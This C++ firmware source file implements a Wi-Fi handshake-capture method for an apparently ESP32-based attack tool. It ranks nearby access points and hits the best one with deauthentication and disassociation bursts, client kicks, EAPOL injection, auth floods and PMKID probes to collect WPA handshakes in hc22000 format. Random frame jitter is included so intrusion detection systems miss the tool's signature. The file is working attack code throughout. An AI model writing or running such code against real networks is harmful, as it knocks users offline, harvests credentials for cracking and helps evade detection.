// "PORKCHOP" capture method - a Porkchop-style composite of the OURS / PAN
// primitives, lifted onto a smarter per-AP scoring + cooldown loop. The
// original M5PORKCHOP picks ONE target at a time and stays on it (RSSI EMA,
// client count, beacon stability, activity); once a pair lands it walks
// away. We don't have a single-target focus knob in our sniffer yet, so
// this method reproduces the effect by scoring APs the same way and giving
// the highest-priority unhandled AP the next kick burst, while leaving
// already-paired ones alone.
//
// The state lives in module-level statics (round-robin index + scoring
// counters) so reset() can wipe them between sessions without leaking into
// the sniffer's static pool. We don't read or write the sniffer's statics
// directly - everything we touch goes through the read-only Ctx that the
// orchestrator hands us, exactly like the other methods in this folder.
#include "method_ctx.h"
#include "../hc22000.h"
#include "../../core/wsl_bypasser.h"
#include <Arduino.h>
#include <string.h>

namespace Cap {
namespace Methods {

// ----- per-target score cache --------------------------------------------
// Porkchop scores APs (RSSI EMA + clients + activity + stability) and
// remembers the score between ticks so a high-RSSI but quiet AP doesn't
// keep stealing bursts from an active one. Reset on session change via
// resetPorkchopState() below.

static const uint8_t  SCORE_SLOTS = 16;
static const uint32_t COOLDOWN_MS = 8000;   // match sniffer's lockMs ceiling

struct ScoreEntry {
    uint8_t  bssid[6];
    int32_t  score;        // EMA, signed to ease clamp/compare
    uint32_t lastKickMs;   // millis() of last burst we sent at it
    uint32_t lastSeenMs;   // millis() of last time it was visible in s_beacons
    bool     used;
};
static ScoreEntry s_scores[SCORE_SLOTS];

// Per-AP activity counters (frames seen since last sweep). Cheap proxy for
// "is anyone actually talking to this AP right now" without sniffing every
// data frame. We bump from the kick path each time an AP is still on the
// channel; the counter decays naturally via the periodic halving below.
static const uint8_t ACT_SLOTS = 16;
static struct {
    uint8_t  bssid[6];
    uint16_t recent;     // frames seen in the last window
    bool     used;
} s_act[ACT_SLOTS];

static uint32_t s_lastActDecayMs = 0;

static int actSlotFor(const uint8_t* bssid) {
    for (uint8_t i = 0; i < ACT_SLOTS; i++) {
        if (s_act[i].used && memcmp(s_act[i].bssid, bssid, 6) == 0) return (int)i;
    }
    for (uint8_t i = 0; i < ACT_SLOTS; i++) {
        if (!s_act[i].used) {
            memset(&s_act[i], 0, sizeof(s_act[i]));
            memcpy(s_act[i].bssid, bssid, 6);
            return (int)i;
        }
    }
    return -1;
}

static void decayActivity(uint32_t now, const Ctx& ctx) {
    if (now - s_lastActDecayMs < 1000) return;
    s_lastActDecayMs = now;
    for (uint8_t i = 0; i < ACT_SLOTS; i++) {
        if (s_act[i].used) s_act[i].recent = (uint16_t)(s_act[i].recent >> 1);
    }
    // DATA ACT: decay sniffer-side dataRecent on every beacon slot we see.
    if (ctx.dataAct && ctx.beacons) {
        for (uint8_t i = 0; i < ctx.beaconCount; i++) {
            if (ctx.beacons[i].dataRecent) {
                ctx.beacons[i].dataRecent = (uint16_t)(ctx.beacons[i].dataRecent >> 1);
            }
        }
    }
}

static void bumpActivity(const uint8_t* bssid) {
    int idx = actSlotFor(bssid);
    if (idx < 0) return;
    if (s_act[idx].recent < 0xFFFF) s_act[idx].recent++;
}

static ScoreEntry* findOrCreateScore(const uint8_t* bssid) {
    for (uint8_t i = 0; i < SCORE_SLOTS; i++) {
        if (s_scores[i].used && memcmp(s_scores[i].bssid, bssid, 6) == 0) return &s_scores[i];
    }
    for (uint8_t i = 0; i < SCORE_SLOTS; i++) {
        if (!s_scores[i].used) {
            memset(&s_scores[i], 0, sizeof(s_scores[i]));
            memcpy(s_scores[i].bssid, bssid, 6);
            s_scores[i].score = 0;
            s_scores[i].used = true;
            return &s_scores[i];
        }
    }
    // Pool full - recycle the oldest (smallest lastSeenMs).
    uint8_t worst = 0;
    uint32_t worstSeen = UINT32_MAX;
    for (uint8_t i = 0; i < SCORE_SLOTS; i++) {
        if (s_scores[i].lastSeenMs < worstSeen) {
            worstSeen = s_scores[i].lastSeenMs;
            worst = i;
        }
    }
    memset(&s_scores[worst], 0, sizeof(s_scores[worst]));
    memcpy(s_scores[worst].bssid, bssid, 6);
    s_scores[worst].score = 0;
    s_scores[worst].used = true;
    return &s_scores[worst];
}

static int32_t computeScore(const BeaconSlot& b, uint8_t hsDepth, bool dataAct) {
    // Mirrors Porkchop's priority scoring in spirit, simplified for our
    // smaller beacon table:
    //   RSSI     -> 0..100  (clamped -100..-30 mapped to 0..100)
    //   CLIENTS  -> 0..40   (each known client = +10, +40 bonus if maxed)
    //   ACTIVITY -> 0..40   (decayed counter, scaled)
    // PMF APs get -50 so we never burn bursts on them (OURS / PAN already
    // skip them anyway, but scoring is cheap insurance against a future
    // method that does try).
    int32_t s = 0;
    int16_t r = b.rssi;
    if (r < -100) r = -100;
    if (r > -30)  r = -30;
    s += (int32_t)((r + 100) * 100 / 70);

    // CLIENTS term is clamped to the documented 0..40 base (min(N,4)*10)
    // plus a flat +40 "busy AP" bonus once N reaches 4.
    int32_t clientTerm = (int32_t)b.clientN * 10;
    if (clientTerm > 40) clientTerm = 40;
    s += clientTerm;
    if (b.clientN >= 4) s += 40;

    // ACTIVITY: DATA ACT on => use real data-frame hits (BeaconSlot::dataRecent).
    // Off => legacy beacon-tick counter in s_act.
    if (dataAct) {
        uint16_t r2 = b.dataRecent;
        if (r2 > 40) r2 = 40;
        s += (int32_t)r2;
    } else {
        int a = actSlotFor(b.bssid);
        if (a >= 0) {
            uint16_t r2 = s_act[a].recent;
            if (r2 > 40) r2 = 40;
            s += r2;
        }
    }

    // Already-captured APs rank at the very bottom (respects HS DEPTH).
    if (Hc22000::hasHandshake(b.bssid, hsDepth)) s = -1000;

    if (b.pmfCapable) s -= 50;

    return s;
}

void resetPorkchopState() {
    memset(s_scores, 0, sizeof(s_scores));
    memset(s_act, 0, sizeof(s_act));
    s_lastActDecayMs = 0;
}

// PMKID probe entry point (called by the dispatcher if ctx.pmkidProbe).
// Same shape as method_pmkid.cpp's probe, but uses a longer round-robin
// delay (2s vs 1.5s) to leave more airtime for the kick ticks we run more
// aggressively under this method.
void pmkidProbePorkchop(const Ctx& ctx) {
    if (!ctx.pmkidProbe) return;
    static uint32_t s_lastProbeMs = 0;
    static uint8_t  s_probeIdx = 0;
    uint32_t now = millis();
    if (now - s_lastProbeMs < 2000) return;
    uint8_t n = ctx.beaconCount;
    if (!n) return;
    for (uint8_t k = 0; k < n; k++) {
        s_probeIdx = (uint8_t)((s_probeIdx + 1) % n);
        const BeaconSlot& b = ctx.beacons[s_probeIdx];
        if (b.channel != ctx.channel) continue;
        if (ctx.isOwnAp(b.bssid)) continue;
        if (ctx.skipPin(b.bssid)) continue;
        if (ctx.isSkipped && ctx.isSkipped(b.bssid)) continue;
        if (b.rssi < ctx.minRssi) continue;
        if (!b.ssid[0]) continue;
        if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) continue;
        WSLBypasser::sendAuthentication(b.bssid);
        WSLBypasser::sendAssociationRequest(b.bssid, b.ssid);
        s_lastProbeMs = now;
        (*ctx.framesDeauth)++;
        return;
    }
}

// Kick one AP per tick - the highest-scoring unpaired one that isn't in
// cooldown. This is the Porkchop-style "focused burst" - the rest of the
// radio time goes to hopping + listening. Round-robin cursor guarantees we
// do eventually walk all APs in a crowded room; the scoring just makes sure
// busy ones don't starve.
void porkchop(const Ctx& ctx) {
    uint32_t now = millis();
    decayActivity(now, ctx);

    // Refresh activity counters for every AP visible right now. This is the
    // cheap "is anyone talking to this AP" signal - we only see the AP when
    // it's beaconing, and every beacon tick on this channel counts as
    // activity. When DATA ACT is on, real data frames already bump
    // BeaconSlot::dataRecent in the sniffer; beacon bumps stay for legacy.
    uint8_t n = ctx.beaconCount;
    if (!ctx.dataAct) {
        for (uint8_t i = 0; i < n; i++) {
            const BeaconSlot& b = ctx.beacons[i];
            if (b.channel != ctx.channel) continue;
            if (b.rssi < ctx.minRssi) continue;
            bumpActivity(b.bssid);
        }
    }

    if (n == 0) {
        if (ctx.csaHerd) csaHerd(ctx);
        return;
    }

    // Global stealth guard. STEALTH pack (bidirKick=false, authFlood=false)
    // means "zero deauth, ever" - honored unconditionally, with NO
    // exception for the locked-BSSID path below. CSA still runs if the
    // pack asked for it (STEALTH leaves csaHerd=false).
    if (!ctx.bidirKick && !ctx.authFlood) {
        if (ctx.csaHerd) csaHerd(ctx);
        return;
    }


    // COOLDOWN (RADIO menu, seconds): 0 = off / use the method's own
    // built-in default (COOLDOWN_MS). A nonzero user value overrides it,
    // same "0 = legacy behavior" convention as the other Porkchop knobs.
    uint32_t cooldownMs = ctx.cooldownSec > 0
        ? (uint32_t)ctx.cooldownSec * 1000u
        : COOLDOWN_MS;

    // Lock-on-BSSID focus: when the sniffer is parked on a target BSSID's
    // channel waiting for M2/M3/M4 of a 4-way handshake, we MUST keep
    // kicking that BSSID and only that BSSID. STRICT LK (default YES)
    // enforces this; when OFF, scoring may drift to a neighbor.
    // Without the override, a higher-scoring neighbor would steal kicks
    // and M2 would never land.
    if (ctx.strictLock && ctx.lockedBssidActive && ctx.lockedBssid[0] != 0) {
        for (uint8_t i = 0; i < n; i++) {
            const BeaconSlot& b = ctx.beacons[i];
            if (memcmp(b.bssid, ctx.lockedBssid, 6) != 0) continue;
            if (b.channel != ctx.channel) continue;
            if (ctx.isOwnAp(b.bssid)) break;
            if (b.rssi < ctx.minRssi) break;
            // If handshake already complete at this depth, the sniffer
            // is about to release the lock anyway - don't burn a burst
            // on it. Fall through to the normal scoring path below.
            if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) break;
            // Keep the score EMA warm so when the lock releases the
            // score for this BSSID isn't a stale 0.
            ScoreEntry* se = findOrCreateScore(b.bssid);
            se->lastSeenMs = now;
            se->score = (se->score * 3 + computeScore(b, ctx.hsDepth, ctx.dataAct)) / 4;
            se->lastKickMs = now; // suppress cooldown for this BSSID
            const BeaconSlot& target = b;
            uint8_t rounds = ctx.kickBurst ? ctx.kickBurst : 1;
            if (target.clientN && ctx.bidirKick) {
                for (uint8_t c = 0; c < target.clientN; c++) {
                    WSLBypasser::sendBidirectionalKick(target.bssid, target.clients[c],
                                                       ctx.deauthReason, rounds);
                    *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 4);
                    if (ctx.eapolTx) {
                        WSLBypasser::sendEAPOLStart(target.bssid, target.clients[c]);
                        WSLBypasser::sendEAPOLLogoff(target.bssid, target.clients[c]);
                    }
                    yield();
                }
            } else {
                for (uint8_t r = 0; r < rounds; r++) {
                    ctx.sendRawMgmt(0xC0, target.bssid, ctx.bcast);
                    if (ctx.jitterMs) delay(1 + (esp_random() % ctx.jitterMs));
                    ctx.sendRawMgmt(0xA0, target.bssid, ctx.bcast);
                }
                *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 2);
            }
            // Pack knobs that any method must honor (AGGRO/WOLF + PORK).
            if (ctx.csaHerd) csaHerd(ctx);
            return; // exit before the normal scoring loop
        }
        // STRICT: locked target not usable this tick — do not score-drift.
        if (ctx.csaHerd) csaHerd(ctx);
        return;
    }

    // Compute / refresh scores; pick the best target this tick.
    int32_t bestScore = INT32_MIN;
    int8_t  bestIdx = -1;
    for (uint8_t i = 0; i < n; i++) {
        const BeaconSlot& b = ctx.beacons[i];
        if (b.channel != ctx.channel) continue;
        if (ctx.isOwnAp(b.bssid)) continue;
        if (ctx.skipPin(b.bssid)) continue;
        if (ctx.isSkipped && ctx.isSkipped(b.bssid)) continue;
        if (b.rssi < ctx.minRssi) continue;
        ScoreEntry* se = findOrCreateScore(b.bssid);
        se->lastSeenMs = now;
        // EMA - new score pulls 25% toward the freshly-computed one.
        int32_t fresh = computeScore(b, ctx.hsDepth, ctx.dataAct);
        se->score = (se->score * 3 + fresh) / 4;

        if (se->lastKickMs != 0 && (now - se->lastKickMs) < cooldownMs) continue;
        // Skip a target this tick if it's on cooldown OR already meets HS
        // DEPTH - matches the -1000 scoring penalty above, kept as a hard
        // skip too so a stale high EMA score can't win a tick anyway.
        if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) continue;

        if (se->score > bestScore) {
            bestScore = se->score;
            bestIdx = (int8_t)i;
        }
    }
    if (bestIdx < 0 || bestScore < ctx.scoreThr) {
        // Nothing to kick this tick — auth-flood fallback (AGGRO/WOLF) + CSA.
        if (ctx.authFlood) {
            for (uint8_t i = 0; i < n; i++) {
                const BeaconSlot& b = ctx.beacons[i];
                if (b.channel != ctx.channel) continue;
                if (ctx.isOwnAp(b.bssid)) continue;
                if (ctx.skipPin(b.bssid)) continue;
                if (ctx.isSkipped && ctx.isSkipped(b.bssid)) continue;
                if (b.rssi < ctx.minRssi) continue;
                if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) continue;
                WSLBypasser::sendAuthFlood(b.bssid, 8);
                *ctx.framesDeauth += 8;
                break;
            }
        }
        if (ctx.csaHerd) csaHerd(ctx);
        return;
    }

    const BeaconSlot& target = ctx.beacons[bestIdx];
    uint8_t rounds = ctx.kickBurst ? ctx.kickBurst : 1;

    // Bidirectional kick is the Porkchop default - we mirror that.
    if (target.clientN && ctx.bidirKick) {
        for (uint8_t c = 0; c < target.clientN; c++) {
            WSLBypasser::sendBidirectionalKick(target.bssid, target.clients[c],
                                               ctx.deauthReason, rounds);
            *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 4);
            if (ctx.eapolTx) {
                WSLBypasser::sendEAPOLStart(target.bssid, target.clients[c]);
                WSLBypasser::sendEAPOLLogoff(target.bssid, target.clients[c]);
            }
            yield();
        }
    } else {
        // No clients tracked yet - broadcast kick (still better than nothing).
        // JITTER MS (RADIO menu): 0 = off (back-to-back frames, legacy
        // behavior). A nonzero value spaces the pair by a random amount so
        // a WIDS doesn't see two identical frames at zero spacing as an
        // obvious tool signature - same idea as the jitter already applied
        // inside WSLBypasser::sendBidirectionalKick(), just user-tunable
        // here since this fallback path calls sendRawMgmt() directly.
        for (uint8_t r = 0; r < rounds; r++) {
            ctx.sendRawMgmt(0xC0, target.bssid, ctx.bcast);
            if (ctx.jitterMs) delay(1 + (esp_random() % ctx.jitterMs));
            ctx.sendRawMgmt(0xA0, target.bssid, ctx.bcast);
        }
        *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 2);
    }

    ScoreEntry* se = findOrCreateScore(target.bssid);
    se->lastKickMs = now;

    // Pack knobs: CSA herd (AGGRO etc.) after the focused kick.
    if (ctx.csaHerd) csaHerd(ctx);
}

CAP_METHOD_REGISTER("FOCUS", porkchop, pmkidProbePorkchop, resetPorkchopState)

} // namespace Methods
} // namespace Cap
